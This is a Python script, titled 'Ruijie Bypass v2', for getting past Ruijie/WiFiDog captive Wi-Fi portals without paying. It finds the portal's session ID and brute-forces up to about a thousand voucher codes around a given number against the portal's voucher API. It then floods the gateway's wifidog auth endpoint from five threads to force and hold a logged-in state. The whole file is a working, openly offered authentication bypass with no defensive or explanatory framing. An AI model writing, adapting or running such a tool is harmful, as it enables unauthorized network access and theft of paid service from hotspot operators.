#!/usr/bin/env python3
"""
Ruijie Bypass v2 - Pure ping + brute force voucher codes
"""
import sys, threading, time, urllib.parse
import requests, urllib3
urllib3.disable_warnings()

MODE_PING = 1
MODE_BRUTE = 2

def main():
    code = "102762"
    mode = MODE_PING
    if "-b" in sys.argv:
        mode = MODE_BRUTE
    if len(sys.argv) > 1 and not sys.argv[1].startswith("-"):
        code = sys.argv[1]

    print(f"[Ruijie] Mode: {'PING' if mode==MODE_PING else 'BRUTE'}  Code: {code}")

    while True:
        sess = requests.Session()
        sess.verify = False

        try:
            # Detect portal
            r = sess.get("http://connectivitycheck.gstatic.com/generate_204",
                         timeout=10, allow_redirects=True)
            if r.status_code == 204:
                try:
                    r2 = requests.get("http://www.google.com", timeout=3)
                    if r2.status_code == 200: sess.close(); time.sleep(5); continue
                except: pass

            portal_url = r.url
            parsed = urllib.parse.urlparse(portal_url)
            params = urllib.parse.parse_qs(parsed.query)
            host = f"{parsed.scheme}://{parsed.netloc}"
            gw_addr = params.get("gw_address", ["192.168.10.1"])[0]
            gw_port = params.get("gw_port", ["2060"])[0]

            # Get sessionId
            r = sess.get(f"{host}/api/auth/wifidog?stage=portal&{parsed.query}", timeout=10)
            sid = urllib.parse.parse_qs(urllib.parse.urlparse(r.url).query).get("sessionId", [""])[0]
            if not sid: sess.close(); time.sleep(3); continue

            api_url = f"{host}/api/auth/voucher/?lang=en_US"
            print(f"[SID] {sid[:16]}...  [GW] {gw_addr}:{gw_port}")

            if mode == MODE_BRUTE:
                # Brute force - try codes around the given code
                print("[Brute forcing...]")
                base = int(code) if code.isdigit() else 100000
                found = False
                for offset in range(-500, 501):
                    c = str(base + offset)
                    if len(c) > 6 or len(c) < 4: continue
                    try:
                        r = sess.post(api_url, json={
                            "accessCode": c, "sessionId": sid, "apiVersion": 1
                        }, timeout=2)
                        j = r.json()
                        if j.get("success") == True and j.get("result",{}).get("authResult") == "1":
                            logon_url = j["result"]["logonUrl"]
                            print(f"  FOUND: {c}")
                            print(f"  logonUrl: {logon_url}")
                            sess.get(logon_url, timeout=5, allow_redirects=False)
                            found = True
                            break
                    except: pass
                    if offset % 100 == 0:
                        print(f"  Tried {offset+500}/1001...")
                    # Refresh session periodically
                    if offset % 200 == 0:
                        r = sess.get(f"{host}/api/auth/wifidog?stage=portal&{parsed.query}", timeout=10)
                        sid = urllib.parse.parse_qs(urllib.parse.urlparse(r.url).query).get("sessionId",[""])[0]
                        if not sid: break
                if not found:
                    print("[Brute failed]")

            # Ping mode (always runs)
            ping_url = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber={code}"
            stop = False
            def pinger():
                while not stop:
                    try: sess.get(ping_url, timeout=3)
                    except: break
            for _ in range(5):
                threading.Thread(target=pinger, daemon=True).start()

            print("[Pinging...]")
            for i in range(30):
                time.sleep(2)
                try:
                    r = requests.get("http://www.google.com", timeout=3)
                    if r.status_code == 200:
                        print("*** ONLINE ***")
                        stop = True
                        while True:
                            time.sleep(5)
                            try:
                                sess.get(ping_url, timeout=3)
                                if requests.get("http://www.google.com", timeout=3).status_code != 200:
                                    break
                            except: break
                        print("[Disconnected]")
                        break
                except: pass
            else:
                print("[Ping failed]")

            stop = True
            sess.close()
            time.sleep(3)

        except KeyboardInterrupt:
            print("\nStopped"); sys.exit(0)
        except Exception as e:
            print(f"[!] {e}")
            time.sleep(3)

if __name__ == "__main__":
    main()
